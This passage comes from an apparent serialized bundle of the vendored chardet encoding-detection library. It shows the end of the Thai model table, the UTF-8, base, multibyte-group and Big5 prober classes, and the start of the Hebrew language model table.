,0,2,1,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n)\n\nTIS620ThaiModel = {\n  'char_to_order_map': TIS620CharToOrderMap,\n  'precedence_matrix': ThaiLangModel,\n  'typical_positive_ratio': 0.926386,\n  'keep_english_letter': False,\n  'charset_name': \"TIS-620\",\n  'language': 'Thai',\n}\n", "thirdparty/chardet/utf8prober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is mozilla.org code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .charsetprober import CharSetProber\nfrom .enums import ProbingState, MachineState\nfrom .codingstatemachine import CodingStateMachine\nfrom .mbcssm import UTF8_SM_MODEL\n\n\n\nclass UTF8Prober(CharSetProber):\n    ONE_CHAR_PROB = 0.5\n\n    def __init__(self):\n        super(UTF8Prober, self).__init__()\n        self.coding_sm = CodingStateMachine(UTF8_SM_MODEL)\n        self._num_mb_chars = None\n        self.reset()\n\n    def reset(self):\n        super(UTF8Prober, self).reset()\n        self.coding_sm.reset()\n        self._num_mb_chars = 0\n\n    @property\n    def charset_name(self):\n        return \"utf-8\"\n\n    @property\n    def language(self):\n        return \"\"\n\n    def feed(self, byte_str):\n        for c in byte_str:\n            coding_state = self.coding_sm.next_state(c)\n            if coding_state == MachineState.ERROR:\n                self._state = ProbingState.NOT_ME\n                break\n            elif coding_state == MachineState.ITS_ME:\n                self._state = ProbingState.FOUND_IT\n                break\n            elif coding_state == MachineState.START:\n                if self.coding_sm.get_current_charlen() >= 2:\n                    self._num_mb_chars += 1\n\n        if self.state == ProbingState.DETECTING:\n            if self.get_confidence() > self.SHORTCUT_THRESHOLD:\n                self._state = ProbingState.FOUND_IT\n\n        return self.state\n\n    def get_confidence(self):\n        unlike = 0.99\n        if self._num_mb_chars < 6:\n            unlike *= self.ONE_CHAR_PROB ** self._num_mb_chars\n            return 1.0 - unlike\n        else:\n            return unlike\n", "thirdparty/chardet/charsetprober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Universal charset detector code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 2001\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#   Shy Shalom - original C code\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nimport logging\nimport re\n\nfrom .enums import ProbingState\n\n\nclass CharSetProber(object):\n\n    SHORTCUT_THRESHOLD = 0.95\n\n    def __init__(self, lang_filter=None):\n        self._state = None\n        self.lang_filter = lang_filter\n        self.logger = logging.getLogger(__name__)\n\n    def reset(self):\n        self._state = ProbingState.DETECTING\n\n    @property\n    def charset_name(self):\n        return None\n\n    def feed(self, buf):\n        pass\n\n    @property\n    def state(self):\n        return self._state\n\n    def get_confidence(self):\n        return 0.0\n\n    @staticmethod\n    def filter_high_byte_only(buf):\n        buf = re.sub(b'([\\x00-\\x7F])+', b' ', buf)\n        return buf\n\n    @staticmethod\n    def filter_international_words(buf):\n        \"\"\"\n        We define three types of bytes:\n        alphabet: english alphabets [a-zA-Z]\n        international: international characters [\\x80-\\xFF]\n        marker: everything else [^a-zA-Z\\x80-\\xFF]\n\n        The input buffer can be thought to contain a series of words delimited\n        by markers. This function works to filter all words that contain at\n        least one international character. All contiguous sequences of markers\n        are replaced by a single space ascii character.\n\n        This filter applies to all scripts which do not use English characters.\n        \"\"\"\n        filtered = bytearray()\n\n        # This regex expression filters out only words that have at-least one\n        # international character. The word may include one marker character at\n        # the end.\n        words = re.findall(b'[a-zA-Z]*[\\x80-\\xFF]+[a-zA-Z]*[^a-zA-Z\\x80-\\xFF]?',\n                           buf)\n\n        for word in words:\n            filtered.extend(word[:-1])\n\n            # If the last character in the word is a marker, replace it with a\n            # space as markers shouldn't affect our analysis (they are used\n            # similarly across all languages and may thus have similar\n            # frequencies).\n            last_char = word[-1:]\n            if not last_char.isalpha() and last_char < b'\\x80':\n                last_char = b' '\n            filtered.extend(last_char)\n\n        return filtered\n\n    @staticmethod\n    def filter_with_english_letters(buf):\n        \"\"\"\n        Returns a copy of ``buf`` that retains only the sequences of English\n        alphabet and high byte characters that are not between <> characters.\n        Also retains English alphabet and high byte characters immediately\n        before occurrences of >.\n\n        This filter can be applied to all scripts which contain both English\n        characters and extended ASCII characters, but is currently only used by\n        ``Latin1Prober``.\n        \"\"\"\n        filtered = bytearray()\n        in_tag = False\n        prev = 0\n\n        for curr in range(len(buf)):\n            # Slice here to get bytes instead of an int with Python 3\n            buf_char = buf[curr:curr + 1]\n            # Check if we're coming out of or entering an HTML tag\n            if buf_char == b'>':\n                in_tag = False\n            elif buf_char == b'<':\n                in_tag = True\n\n            # If current character is not extended-ASCII and not alphabetic...\n            if buf_char < b'\\x80' and not buf_char.isalpha():\n                # ...and we're not in a tag\n                if curr > prev and not in_tag:\n                    # Keep everything after last non-extended-ASCII,\n                    # non-alphabetic character\n                    filtered.extend(buf[prev:curr])\n                    # Output a space to delimit stretch we kept\n                    filtered.extend(b' ')\n                prev = curr + 1\n\n        # If we're not in a tag...\n        if not in_tag:\n            # Keep everything after last non-extended-ASCII, non-alphabetic\n            # character\n            filtered.extend(buf[prev:])\n\n        return filtered\n", "thirdparty/chardet/mbcsgroupprober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Universal charset detector code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 2001\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#   Shy Shalom - original C code\n#   Proofpoint, Inc.\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .charsetgroupprober import CharSetGroupProber\nfrom .utf8prober import UTF8Prober\nfrom .sjisprober import SJISProber\nfrom .eucjpprober import EUCJPProber\nfrom .gb2312prober import GB2312Prober\nfrom .euckrprober import EUCKRProber\nfrom .cp949prober import CP949Prober\nfrom .big5prober import Big5Prober\nfrom .euctwprober import EUCTWProber\n\n\nclass MBCSGroupProber(CharSetGroupProber):\n    def __init__(self, lang_filter=None):\n        super(MBCSGroupProber, self).__init__(lang_filter=lang_filter)\n        self.probers = [\n            UTF8Prober(),\n            SJISProber(),\n            EUCJPProber(),\n            GB2312Prober(),\n            EUCKRProber(),\n            CP949Prober(),\n            Big5Prober(),\n            EUCTWProber()\n        ]\n        self.reset()\n", "thirdparty/chardet/big5prober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .mbcharsetprober import MultiByteCharSetProber\nfrom .codingstatemachine import CodingStateMachine\nfrom .chardistribution import Big5DistributionAnalysis\nfrom .mbcssm import BIG5_SM_MODEL\n\n\nclass Big5Prober(MultiByteCharSetProber):\n    def __init__(self):\n        super(Big5Prober, self).__init__()\n        self.coding_sm = CodingStateMachine(BIG5_SM_MODEL)\n        self.distribution_analyzer = Big5DistributionAnalysis()\n        self.reset()\n\n    @property\n    def charset_name(self):\n        return \"Big5\"\n\n    @property\n    def language(self):\n        return \"Chinese\"\n", "thirdparty/chardet/langhebrewmodel.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Universal charset detector code.\n#\n# The Initial Developer of the Original Code is\n#          Simon Montagu\n# Portions created by the Initial Developer are Copyright (C) 2005\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#   Shy Shalom - original C code\n#   Shoshannah Forbes - original C code (?)\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\n# 255: Control characters that usually does not exist in any text\n# 254: Carriage/Return\n# 253: symbol (punctuation) that does not belong to word\n# 252: 0 - 9\n\n# Windows-1255 language model\n# Character Mapping Table:\nWIN1255_CHAR_TO_ORDER_MAP = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253, 69, 91, 79, 80, 92, 89, 97, 90, 68,111,112, 82, 73, 95, 85,  # 40\n 78,121, 86, 71, 67,102,107, 84,114,103,115,253,253,253,253,253,  # 50\n253, 50, 74, 60, 61, 42, 76, 70, 64, 53,105, 93, 56, 65, 54, 49,  # 60\n 66,110, 51, 43, 44, 63, 81, 77, 98, 75,108,253,253,253,253,253,  # 70\n124,202,203,204,205, 40, 58,206,207,208,209,210,211,212,213,214,\n215, 83, 52, 47, 46, 72, 32, 94,216,113,217,109,218,219,220,221,\n 34,116,222,118,100,223,224,117,119,104,125,225,226, 87, 99,227,\n106,122,123,228, 55,229,230,101,231,232,120,233, 48, 39, 57,234,\n 30, 59, 41, 88, 33, 37, 36, 31, 29, 35,235, 62, 28,236,126,237,\n238, 38, 45,239,240,241,242,243,127,244,245,246,247,248,249,250,\n  9,  8, 20, 16,  3,  2, 24, 14, 22,  1, 25, 15,  4, 11,  6, 23,\n 12, 19, 13, 26, 18, 27, 21, 17,  7, 10,  5,251,252,128, 96,253,\n)\n\n# Model Table:\n# total sequences: 100%\n# first 512 sequences: 98.4004%\n# first 1024 sequences: 1.5981%\n# rest  sequences:      0.087%\n# negative sequences:   0.0015%\nHEBREW_LANG_MODEL = (\n0,3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,3,3,3,2,3,2,1,2,0,1,0,0,\n3,0,3,1,0,0,1,3,2,0,1,1,2,0,2,2,2,1,1,1,1,2,1,1,1,2,0,0,2,2,0,1,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,2,2,\n1,2,1,2,1,2,0,0,2,0,0,0,0,0,1,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,2,\n1,2,1,3,1,1,0,0,2,0,0,0,1,0,1,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,0,1,2,2,1,3,\n1,2,1,1,2,2,0,0,2,2,0,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,1,0,1,1,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,2,2,2,2,3,2,\n1,2,1,2,2,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,2,3,2,2,3,2,2,2,1,2,2,2,2,\n1,2,1,1,2,2,0,1,2,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,0,2,2,2,2,2,\n0,2,0,2,2,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,0,2,2,2,\n0,2,1,2,2,2,0,0,2,1,0,0,0,0,1,0,1,0,0,0,0,0,0,2,0,0,0,0,0,0,1,0,\n3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,3,2,1,2,3,2,2,2,\n1,2,1,2,2,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,1,0,\n3,3,3,3,3,3,3,3,3,2,3,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,3,1,0,2,0,2,\n0,2,1,2,2,2,0,0,1,2,0,0,0,0,1,0,1,0,0,0,0,0,0,1,0,0,0,2,0,0,1,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,2,3,2,2,3,2,1,2,1,1,1,\n0,1,1,1,1,1,3,0,1,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,\n3,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,0,1,1,0,0,1,0,0,1,0,0,0,0,\n0,0,1,0,0,0,0,0,2,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,2,2,2,2,2,\n0,2,0,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,\n3,3,3,3,3,3,3,3,3,2,3,3,3,2,1,2,3,3,2,3,3,3,3,2,3,2,1,2,0,2,1,2,\n0,2,0,2,2,2,0,0,1,2,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,\n3,3,3,3,3,3,3,3,3,2,3,3,3,1,2,2,3,3,2,3,2,3,2,2,3,1,2,2,0,2,2,2,\n0,2,1,2,2,2,0,0,1,2,0,0,0,0,1,0,0,0,0,0,1,0,0,1,0,0,0,1,0,0,1,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,2,3,3,2,2,2,3,3,3,3,1,3,2,2,2,\n0,2,0,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,3,3,3,2,3,2,2,2,1,2,2,0,2,2,2,2,\n0,2,0,2,2,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,\n3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,1,3,2,3,3,2,3,3,2,2,1,2,2,2,2,2,2,\n0,2,1,2,1,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,1,0,\n3,3,3,3,3,3,2,3,2,3,3,2,3,3,3,3,2,3,2,3,3,3,3,3,2,2,2,2,2,2,2,1,\n0,2,0,1,2,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,\n3,3,3,3,3,3,3,3,3,2,1,2,3,3,3,3,3,3,3,2,3,2,3,2,1,2,3,0,2,1,2,2,\n0,2,1,1,2,1,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,2,0,\n3,3,3,3,3,3,3,3,3,2,3,3,3,3,2,1,3,1,2,2,2,1,2,3,3,1,2,1,2,2,2,2,\n0,1,1,1,1,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,2,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,3,3,0,2,3,3,3,1,3,3,3,1,2,2,2,2,1,1,2,2,2,2,2,2,\n0,2,0,1,1,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,\n3,3,3,3,3,3,2,3,3,3,2,2,3,3,3,2,1,2,3,2,3,2,2,2,2,1,2,1,1,1,2,2,\n0,2,1,1,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,\n3,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,0,0,1,0,0,0,0,0,\n1,0,1,0,0,0,0,0,2,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,2,3,3,2,3,1,2,2,2,2,3,2,3,1,1,2,2,1,2,2,1,1,0,2,2,2,2,\n0,1,0,1,2,2,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,\n3,0,0,1,1,0,1,0,0,1,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,0,\n0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,0,1,0,1,0,1,1,0,1,1,0,0,0,1,1,0,1,1,1,0,0,0,0,0,0,1,0,0,0,0,0,\n0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,0,0,0,1,1,0,1,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,\n3,2,2,1,2,2,2,2,2,2,2,1,2,2,1,2,2,1,1,1,1,1,1,1,1,2,1,1,0,3,3,3,\n0,3,0,2,2,2,2,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,\n2,2,2,3,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,1,2,2,1,2,2,2,1,1,1,2,0,1,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,2,2,2,2,2,2,2,2,2,2,1,2,2,2,2,2,2,2,2,2,2,2,0,2,2,0,0,0,0,0,0,\n0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,3,1,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,1,2,1,0,2,1,0,\n0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,1,1,1,1,1,1,1,1,1,1,0,0,1,1,1,1,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,\n0,3,1,1,2,2,2,2,2,1,2,2,2,1,1,2,2,2,2,2,2,2,1,2,2,1,0,1,1,1,1,0,\n0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,2,1,1,1,1,2,1,1,2,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,0,0,0,0,0,0,\n0,0,2,0,0,0,0,0,0,0,0,1,1,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,0,1,0,0,\n2,1,1,2,2,2,2,2,2,2,2,2,2,2,1,2,2,2,2,2,1,2,1,2,1,1,1,1,0,0,0,0,\n0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,2,1,2,2,2,2,2,2,2,2,2,2,1,2,1,2,1,1,2,1,1,1,2,1,2,1,2,0,1,0,1,\n0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,1,2,2,2,1,2,2,2,2,2,2,2,2,1,2,1,1,1,1,1,1,2,1,2,1,1,0,1,0,1,\n0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,1,2,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,2,\n0,2,0,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,\n3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,1,1,1,1,1,1,1,0,1,1,0,1,0,0,1,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,2,0,1,1,1,0,1,0,0,0,1,1,0,1,1,0,0,0,0,0,1,1,0,0,\n0,1,1,1,2,1,2,2,2,0,2,0,2,0,1,1,2,1,1,1,1,2,1,0,1,1,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,0,1,0,0,0,0,0,1,0,1,2,2,0,1,0,0,1,1,2,2,1,2,0,2,0,0,0,1,2,0,1,\n2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,2,0,2,1,2,0,2,0,0,1,1,1,1,1,1,0,1,0,0,0,1,0,0,1,\n2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,1,0,0,0,0,0,1,0,2,1,1,0,1,0,0,1,1,1,2,2,0,0,1,0,0,0,1,0,0,1,\n1,1,2,1,0,1,1,1,0,1,0,1,1,1,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,2,2,1,\n0,2,0,1,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,1,0,0,1,0,1,1,1,1,0,0,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,1,1,1,1,1,1,1,1,2,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,1,1,1,0,1,1,0,1,0,0,0,1,1,0,1,\n2,0,1,0,1,0,1,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,1,0,1,1,1,0,1,0,0,1,1,2,1,1,2,0,1,0,0,0,1,1,0,1,\n1,0,0,1,0,0,1,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,1,0,1,1,2,0,1,0,0,0,0,2,1,1,2,0,2,0,0,0,1,1,0,1,\n1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,1,0,2,1,1,0,1,0,0,2,2,1,2,1,1,0,1,0,0,0,1,1,0,1,\n2,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,1,2,2,0,0,0,0,0,1,1,0,1,0,0,1,0,0,0,0,1,0,1,\n1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,1,2,2,0,0,0,0,2,1,1,1,0,2,1,1,0,0,0,2,1,0,1,\n1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,1,0,1,1,2,0,1,0,0,1,1,0,2,1,1,0,1,0,0,0,1,1,0,1,\n2,2,1,1,1,0,1,1,0,1,1,0,1,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,1,0,2,1,1,0,1,0,0,1,1,0,1,2,1,0,2,0,0,0,1,1,0,1,\n2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,\n0,1,0,0,2,0,2,1,1,0,1,0,1,0,0,1,0,0,0,0,1,0,0,0,1,0,0,0,0,0,1,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,1,0,1,1,2,0,1,0,0,1,1,1,0,1,0,0,1,0,0,0,1,0,0,1,\n1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,0,0,0,0,0,0,0,1,0,1,1,0,0,1,0,0,2,1,1,1,1,1,0,1,0,0,0,0,1,0,1,\n0,1,1,1,2,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,1,2,1,0,0,